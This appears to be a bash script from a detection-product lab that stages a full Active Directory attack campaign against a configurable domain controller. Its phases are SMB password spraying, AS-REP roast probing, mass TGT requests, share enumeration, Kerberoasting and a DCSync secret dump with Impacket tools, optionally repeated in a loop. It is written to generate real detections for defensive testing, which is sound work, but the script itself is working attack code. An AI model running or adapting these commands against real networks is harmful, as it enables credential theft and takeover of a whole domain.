#!/bin/bash
# A real, staged attack campaign against the lab domain controller.
#
# Each phase uses a genuine tool over a genuine protocol, so the domain
# controller logs genuine events and LibraX raises genuine detections. Phases are
# spaced out so the incident visibly assembles in the dashboard rather than
# appearing all at once.
set -uo pipefail

REALM="${REALM:-LIBRAX.LOCAL}"
DOMAIN="${DOMAIN:-LIBRAX}"
DC_HOST="${DC_HOST:-dc01}"
DC_FQDN="${DC_FQDN:-dc01.librax.local}"
DC_IP="${DC_IP:-172.30.0.10}"
VICTIM="${VICTIM:-victim}"
VICTIM_PASS="${VICTIM_PASS:-Winter2026!}"
ADMIN_PASS="${ADMIN_PASS:-LibraX-Admin-2026!}"
# The reused password the spray reveals, and the service account's -- kept in sync
# with the DC via the same environment variables.
SHARED_PASS="${SHARED_PASS:-Autumn-2025-Placeholder!}"
SVC_PASS="${SVC_PASS:-Sup3rSecret-Svc-2025!}"
REPEAT="${REPEAT:-false}"
PHASE_GAP="${PHASE_GAP:-15}"

USERS=/opt/wordlists/users.txt
PASSWORDS=/opt/wordlists/passwords.txt

# Kerberos + name resolution for the lab realm.
cat > /etc/krb5.conf <<EOF
[libdefaults]
    default_realm = ${REALM}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
[realms]
    ${REALM} = {
        kdc = ${DC_FQDN}
        admin_server = ${DC_FQDN}
    }
[domain_realm]
    .${REALM,,} = ${REALM}
    ${REALM,,} = ${REALM}
EOF
grep -q "$DC_FQDN" /etc/hosts || echo "${DC_IP} ${DC_FQDN} ${DC_HOST}" >> /etc/hosts

banner() { echo; echo "=========== $* ==========="; echo; }

wait_for_dc() {
    banner "waiting for the domain controller"
    for _ in $(seq 1 90); do
        if nc -z "$DC_IP" 445 2>/dev/null && nc -z "$DC_IP" 88 2>/dev/null; then
            echo "[attacker] DC reachable on 445/88"
            sleep 5
            return 0
        fi
        sleep 3
    done
    echo "[attacker] DC never came up"
    return 1
}

phase_smb_spray() {
    banner "PHASE 1  SMB password spray (NTLM)"
    # Every wrong password against every account: real NTLM auth failures.
    while read -r pass; do
        [ -z "$pass" ] && continue
        while read -r user; do
            [ -z "$user" ] && continue
            smbclient -L "//${DC_FQDN}" -U "${DOMAIN}\\${user}%${pass}" -m SMB3 \
                >/dev/null 2>&1
        done < "$USERS"
    done < "$PASSWORDS"
    echo "[attacker] spray complete"
}

phase_kerberos_enum() {
    banner "PHASE 2  Kerberos account enumeration (TGT requests across the domain)"
    # AS-REP roast probe: one pre-auth-less AS-REQ per user.
    GetNPUsers.py "${REALM}/" -no-pass -usersfile "$USERS" \
        -dc-ip "$DC_IP" -dc-host "$DC_FQDN" 2>&1 | tail -n 20

    # The spray revealed the reused password, so now request a genuine Kerberos TGT
    # for every ordinary account from this one host. The KDC issues and audits each
    # ticket: many distinct principals, one source -- the enumeration signature.
    echo "[attacker] requesting Kerberos TGTs across the domain"
    for user in alice bob carol dave erin frank grace heidi ivan judy; do
        getTGT.py "${REALM}/${user}:${SHARED_PASS}" -dc-ip "$DC_IP" >/dev/null 2>&1 \
            && echo "  [+] TGT issued for ${user}"
    done
    # And the service account, a Kerberoasting target.
    getTGT.py "${REALM}/svc_sql:${SVC_PASS}" -dc-ip "$DC_IP" >/dev/null 2>&1 \
        && echo "  [+] TGT issued for svc_sql (service account)"
    echo "[attacker] kerberos sweep complete"
}

phase_compromise() {
    banner "PHASE 3  Valid logon (one guess landed) + SMB share sweep"
    # The spray "succeeds": a real authenticated SMB session as the victim.
    smbclient -L "//${DC_FQDN}" -U "${DOMAIN}\\${VICTIM}%${VICTIM_PASS}" -m SMB3 \
        2>&1 | tail -n 8

    # Enumerate shares with a real tree connect to each: genuine SMB access the DC
    # authorizes and audits, one Authorization record per share.
    echo "[attacker] connecting to each share as ${VICTIM}"
    for share in sysvol netlogon IPC\$; do
        smbclient "//${DC_FQDN}/${share}" -U "${DOMAIN}\\${VICTIM}%${VICTIM_PASS}" \
            -m SMB3 -c 'ls; quit' >/dev/null 2>&1
    done
    echo "[attacker] share sweep complete"
}

phase_kerberoast() {
    banner "PHASE 4  Kerberoast (request service ticket)"
    GetUserSPNs.py "${REALM}/${VICTIM}:${VICTIM_PASS}" \
        -dc-ip "$DC_IP" -dc-host "$DC_FQDN" -request 2>&1 | tail -n 20
}

phase_dcsync() {
    banner "PHASE 5  DCSync (replicate secrets)"
    # Real DRSUAPI replication pull with domain-admin credentials: DsBind followed by
    # DsGetNCChanges against the DC -- the DCSync signature. (-just-dc reaches the
    # replication handler; -just-dc-user hits a DsCrackNames path Samba rejects.)
    secretsdump.py "${REALM}/Administrator:${ADMIN_PASS}@${DC_FQDN}" \
        -just-dc 2>&1 | tail -n 20
}

campaign() {
    phase_smb_spray;      sleep "$PHASE_GAP"
    phase_kerberos_enum;  sleep "$PHASE_GAP"
    phase_compromise;     sleep "$PHASE_GAP"
    phase_kerberoast;     sleep "$PHASE_GAP"
    phase_dcsync
    banner "campaign complete — check the LibraX dashboard"
}

wait_for_dc || exit 1

if [ "$REPEAT" = "true" ]; then
    while true; do
        campaign
        echo "[attacker] sleeping before the next campaign ..."
        sleep "${REPEAT_GAP:-300}"
    done
else
    campaign
    # Stay alive so the container can be re-run interactively:
    #   docker compose -f lab/docker-compose.yml exec attacker /usr/local/bin/attack.sh
    tail -f /dev/null
fi
